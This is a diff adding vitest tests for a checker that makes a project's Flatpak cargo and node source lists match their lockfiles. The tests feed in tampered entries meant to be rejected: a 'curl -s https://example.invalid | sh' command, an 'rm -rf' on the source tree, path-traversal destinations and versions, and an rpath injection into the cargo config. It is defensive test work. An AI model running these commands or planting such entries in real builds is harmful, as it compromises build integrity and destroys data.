@@ -6,6 +6,8 @@
 // `sources.mjs`; the fixtures under `fixtures/sources-*/` are tiny lockfiles
 // and lists, each wrong in one way.
 import crypto from "node:crypto";
+import fs from "node:fs";
+import os from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
@@ -36,6 +38,32 @@ const node = (name: string) => {
 };
 
 const REGENERATE = "Run `npm run flatpak:sources` in the dev container and commit both lists.";
+/** A list entry, as the generators write it. */
+type Entry = Record<string, unknown>;
+
+/** The `ok` fixture with one of its lists changed by `change`, checked. */
+function changed(list: "cargo" | "node", change: (entries: Entry[]) => void) {
+  const f = fixture("ok");
+  const original = list === "cargo" ? f.cargoSourcesPath : f.nodeSourcesPath;
+  const entries = JSON.parse(fs.readFileSync(original, "utf8")) as Entry[];
+  change(entries);
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hoplodex-sources-"));
+  try {
+    const sourcesPath = path.join(dir, path.basename(original));
+    fs.writeFileSync(sourcesPath, JSON.stringify(entries));
+    return list === "cargo"
+      ? checkCargoSources({ cargoLockPath: f.cargoLockPath, sourcesPath })
+      : checkNodeSources({ packageLockPath: f.packageLockPath, sourcesPath });
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+}
+const find = (entries: Entry[], match: (e: Entry) => boolean) => {
+  const entry = entries.find(match);
+  if (!entry) throw new Error("the ok fixture has no such entry");
+  return entry;
+};
+
 const CARGO = "flatpak/cargo-sources.json does not match src-tauri/Cargo.lock";
 const NODE = "flatpak/node-sources.json does not match package-lock.json";
 
@@ -86,7 +114,7 @@ describe("011 US3-2 - the offline source lists match the lockfiles", () => {
   });
 
   describe("a list that covers its lockfile exactly", () => {
-    it("passes, the generators' inline and script entries and a link entry included", () => {
+    it("passes, the generators' inline, script and shell entries and a link entry included", () => {
       expect(checkSources(fixture("ok"))).toEqual([]);
     });
   });
@@ -162,7 +190,7 @@ describe("011 US3-2 - the offline source lists match the lockfiles", () => {
 
   describe("an archive in the node tool cache (011 research.md §3)", () => {
     it("is accepted only as a copy of a package the lockfile has, and any other archive fails", () => {
-      // The fixture also holds a copy of left-pad 1.3.0 (same url and hash), which passes.
+      // sources-ok holds the copy that passes: an @esbuild/ package's, in its own folder.
       expect(node("node-tool-cache-extra")).toBe(
         `${NODE}: the list has a source for https://registry.npmjs.org/extra-pkg/-/extra-pkg-9.9.9.tgz, ` +
           `which package-lock.json does not have. ${REGENERATE}`,
@@ -189,5 +217,304 @@ describe("011 US3-2 - the offline source lists match the lockfiles", () => {
   it("reports each list that is wrong, and only those", () => {
     expect(checkSources(fixture("cargo-missing"))).toHaveLength(1);
     expect(checkSources(fixture("node-missing"))).toHaveLength(1);
+  });
+});
+
+// code scanning alert build-ci/cwe-345: an inline, script or shell entry writes
+// or runs something in the build directory, where the checkout is, before the
+// build; one the pinned generators would not write fails like any other difference.
+describe("code scanning alert build-ci/cwe-345 - only the generators' own inline, script and shell entries", () => {
+  const stray = (list: string, where: string) =>
+    `${list}: the list has ${where} that the generator does not write. ${REGENERATE}`;
+  const FOO = "45b593694ffbea195d7d6830f5ea6e6e647d9a109f237e84cbaf40d028caddd4";
+  const intoCheckout = {
+    type: "inline",
+    contents: "fn main() {}",
+    dest: "src-tauri/src",
+    "dest-filename": "main.rs",
+  };
+
+  describe("cargo-sources.json", () => {
+    it("accepts a checksum file written with spaces, as the generator's json.dumps writes it", () => {
+      expect(
+        changed("cargo", (e) => {
+          find(e, (x) => x.dest === "cargo/vendor/foo-1.2.3" && x.type === "inline").contents =
+            `{"package": "${FOO}", "files": {}}`;
+        }),
+      ).toBeNull();
+    });
+
+    it("refuses an inline entry into the checkout", () => {
+      expect(changed("cargo", (e) => e.push(intoCheckout))).toBe(
+        stray(CARGO, "an inline source at src-tauri/src/main.rs"),
+      );
+    });
+
+    it("refuses a crate's checksum file that names files or another checksum", () => {
+      const at = "an inline source at cargo/vendor/foo-1.2.3/.cargo-checksum.json";
+      const checksum = (e: Entry[]) =>
+        find(e, (x) => x.dest === "cargo/vendor/foo-1.2.3" && x.type === "inline");
+      expect(
+        changed("cargo", (e) => {
+          checksum(e).contents = JSON.stringify({ package: FOO, files: { "src/lib.rs": "00" } });
+        }),
+      ).toBe(stray(CARGO, at));
+      expect(
+        changed("cargo", (e) => {
+          checksum(e).contents = JSON.stringify({ package: sha256("other"), files: {} });
+        }),
+      ).toBe(stray(CARGO, at));
+      expect(
+        changed("cargo", (e) => {
+          checksum(e).url = "https://example.invalid/checksum.json";
+        }),
+      ).toBe(stray(CARGO, at));
+    });
+
+    it("refuses a checksum file for a crate Cargo.lock does not have", () => {
+      expect(
+        changed("cargo", (e) =>
+          e.push({
+            type: "inline",
+            contents: JSON.stringify({ package: FOO, files: {} }),
+            dest: "cargo/vendor/evil-1.0.0",
+            "dest-filename": ".cargo-checksum.json",
+          }),
+        ),
+      ).toBe(stray(CARGO, "an inline source at cargo/vendor/evil-1.0.0/.cargo-checksum.json"));
+    });
+
+    it("refuses another cargo config", () => {
+      expect(
+        changed("cargo", (e) => {
+          const config = find(e, (x) => x["dest-filename"] === "config");
+          config.contents = `${String(config.contents)}[build]\nrustflags = ["-C", "link-arg=-Wl,-rpath,/tmp"]\n`;
+        }),
+      ).toBe(stray(CARGO, "an inline source at cargo/config"));
+    });
+
+    it("refuses any script or shell entry", () => {
+      expect(changed("cargo", (e) => e.push({ type: "shell", commands: ["true"] }))).toBe(
+        stray(CARGO, "a shell source"),
+      );
+      expect(
+        changed("cargo", (e) =>
+          e.push({ type: "script", commands: ["true"], dest: "cargo", "dest-filename": "x.sh" }),
+        ),
+      ).toBe(stray(CARGO, "a script source at cargo/x.sh"));
+    });
+
+    it("refuses a crate whose version would put its folder outside cargo/vendor", () => {
+      // A lockfile line this reader takes for a package (inside a [metadata]
+      // string, say) builds the folder from the version as written.
+      const f = fixture("ok");
+      const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hoplodex-sources-"));
+      try {
+        const version = "1.2.3.crate#/../../../src-tauri/src";
+        const cargoLockPath = path.join(dir, "Cargo.lock");
+        fs.writeFileSync(
+          cargoLockPath,
+          fs
+            .readFileSync(f.cargoLockPath, "utf8")
+            .replace('version = "1.2.3"', `version = "${version}"`),
+        );
+        const sourcesPath = path.join(dir, "cargo-sources.json");
+        const entries = JSON.parse(fs.readFileSync(f.cargoSourcesPath, "utf8")) as Entry[];
+        for (const e of entries) {
+          if (e.dest === "cargo/vendor/foo-1.2.3") e.dest = `cargo/vendor/foo-${version}`;
+          if (e.url) e.url = String(e.url).replace("foo-1.2.3", `foo-${version}`);
+        }
+        fs.writeFileSync(sourcesPath, JSON.stringify(entries));
+        expect(checkCargoSources({ cargoLockPath, sourcesPath })).toBe(
+          `${CARGO}: crate "foo" "${version}" has a name or version crates.io doesn't allow. ${REGENERATE}`,
+        );
+      } finally {
+        fs.rmSync(dir, { recursive: true, force: true });
+      }
+    });
+
+    it("refuses a crate archive with a key the generator does not write", () => {
+      expect(
+        changed("cargo", (e) => {
+          find(e, (x) => x.type === "archive" && x.dest === "cargo/vendor/foo-1.2.3").path =
+            "src-tauri";
+        }),
+      ).toBe(`${CARGO}: crate foo 1.2.3 unpacks to cargo/vendor/foo-1.2.3. ${REGENERATE}`);
+    });
+
+    it("refuses a crate unpacked anywhere but its vendor folder", () => {
+      expect(
+        changed("cargo", (e) => {
+          find(e, (x) => x.type === "archive" && x.dest === "cargo/vendor/foo-1.2.3").dest =
+            "src-tauri";
+        }),
+      ).toBe(`${CARGO}: crate foo 1.2.3 unpacks to src-tauri. ${REGENERATE}`);
+    });
+  });
+
+  describe("node-sources.json", () => {
+    const headers = (e: Entry[]) => find(e, (x) => x.type === "script");
+    const esbuild = (e: Entry[]) => find(e, (x) => x.type === "shell" && x.dest !== undefined);
+
+    it("refuses an inline entry into the checkout, or over the headers script", () => {
+      expect(changed("node", (e) => e.push(intoCheckout))).toBe(
+        stray(NODE, "an inline source at src-tauri/src/main.rs"),
+      );
+      expect(
+        changed("node", (e) =>
+          e.push({
+            ...intoCheckout,
+            dest: "flatpak-node",
+            "dest-filename": "setup_sdk_node_headers.sh",
+          }),
+        ),
+      ).toBe(stray(NODE, "an inline source at flatpak-node/setup_sdk_node_headers.sh"));
+    });
+
+    it("refuses an npm cache index entry that climbs out of the cache", () => {
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "inline").dest =
+            "flatpak-node/npm-cache/_cacache/index-v5/../../../src";
+        }),
+      ).toMatch(
+        /^flatpak\/node-sources\.json does not match package-lock\.json: the list has an inline source at flatpak-node\/npm-cache\/_cacache\/index-v5\/\.\.\//,
+      );
+    });
+
+    it("refuses a headers script with any other command", () => {
+      expect(
+        changed("node", (e) => {
+          (headers(e).commands as string[]).push("curl -s https://example.invalid | sh");
+        }),
+      ).toBe(stray(NODE, "a script source at flatpak-node/setup_sdk_node_headers.sh"));
+    });
+
+    it("refuses a shell entry with any other command", () => {
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "shell" && x.dest === undefined).commands = [
+            "bash flatpak-node/setup_sdk_node_headers.sh",
+            "cp flatpak-node/x src-tauri/src/main.rs",
+          ];
+        }),
+      ).toBe(stray(NODE, "a shell source"));
+    });
+
+    it("refuses an esbuild shell entry for a binary the list does not unpack, or for another arch", () => {
+      const at = "a shell source at flatpak-node/cache/esbuild";
+      expect(
+        changed("node", (e) => {
+          esbuild(e).commands = (esbuild(e).commands as string[]).map((c) =>
+            c.replaceAll("linux-x64@0.25.12", "linux-x64@0.25.13"),
+          );
+        }),
+      ).toBe(stray(NODE, at));
+      expect(
+        changed("node", (e) => {
+          esbuild(e)["only-arches"] = ["aarch64"];
+        }),
+      ).toBe(stray(NODE, at));
+      expect(
+        changed("node", (e) => {
+          (esbuild(e).commands as string[]).push("rm -rf ../../../src-tauri");
+        }),
+      ).toBe(stray(NODE, at));
+    });
+
+    it("refuses a tool cache copy that climbs out of the cache", () => {
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "archive").dest = "flatpak-node/cache/../../src-tauri";
+        }),
+      ).not.toBeNull();
+    });
+
+    it("refuses a tool cache copy of a package that isn't esbuild's, or outside its own folder", () => {
+      // A copy anywhere else in the cache could plant a symlink a later copy follows.
+      expect(
+        changed("node", (e) => {
+          const leftPad = find(e, (x) => x.type === "file");
+          e.push({
+            type: "archive",
+            url: leftPad.url,
+            "strip-components": 1,
+            sha512: leftPad.sha512,
+            dest: "flatpak-node/cache/left-pad/.package/left-pad@1.3.0",
+          });
+        }),
+      ).toBe(`${NODE}: npm package left-pad@1.3.0 has 2 sources, not one. ${REGENERATE}`);
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "archive").dest = "flatpak-node/cache/x/l/src";
+        }),
+      ).toBe(stray(NODE, "a shell source at flatpak-node/cache/esbuild"));
+    });
+
+    it("refuses an esbuild shell entry for a tool cache copy of another package", () => {
+      expect(
+        changed("node", (e) => {
+          const leftPad = find(e, (x) => x.type === "file");
+          const archive = find(e, (x) => x.type === "archive");
+          archive.url = leftPad.url;
+          archive.sha512 = leftPad.sha512;
+        }),
+      ).toBe(stray(NODE, "a shell source at flatpak-node/cache/esbuild"));
+    });
+
+    it("refuses a field of another type than the generator writes, which flatpak-builder would skip", () => {
+      // An array `dest` reads as the text of its one element, but flatpak-builder
+      // drops it and unpacks the archive at the build directory's root.
+      const archive = (e: Entry[]) => find(e, (x) => x.type === "archive");
+      expect(
+        changed("node", (e) => {
+          archive(e).dest = ["flatpak-node/cache/x"];
+        }),
+      ).toMatch(
+        /^flatpak\/node-sources\.json does not match package-lock\.json: the list has a source with a field of the wrong type: /,
+      );
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "inline").dest = [
+            "flatpak-node/npm-cache/_cacache/index-v5/00/00",
+          ];
+        }),
+      ).toMatch(/a field of the wrong type/);
+      expect(
+        changed("node", (e) => {
+          archive(e)["strip-components"] = "1";
+        }),
+      ).toMatch(/a field of the wrong type/);
+      expect(changed("node", (e) => e.push("shell" as unknown as Entry))).toMatch(
+        /a field of the wrong type: "shell"/,
+      );
+      expect(
+        changed("cargo", (e) => {
+          find(e, (x) => x.type === "archive").dest = ["cargo/vendor/foo-1.2.3"];
+        }),
+      ).toMatch(
+        /^flatpak\/cargo-sources\.json does not match src-tauri\/Cargo\.lock: the list has a source with a field of the wrong type: /,
+      );
+    });
+
+    it("refuses a package's tarball with a key the generator does not write", () => {
+      expect(
+        changed("node", (e) => {
+          find(e, (x) => x.type === "file").path = "src-tauri/src/main.rs";
+        }),
+      ).toMatch(/npm package left-pad@1\.3\.0 is put at flatpak-node\/npm-cache\//);
+    });
+
+    it("refuses a package's tarball put anywhere but the npm cache", () => {
+      expect(
+        changed("node", (e) => {
+          const file = find(e, (x) => x.type === "file");
+          file.dest = "src-tauri/src";
+          file["dest-filename"] = "main.rs";
+        }),
+      ).toBe(
+        `${NODE}: npm package left-pad@1.3.0 is put at src-tauri/src, not in the npm cache. ${REGENERATE}`,
+      );
+    });
   });
 });
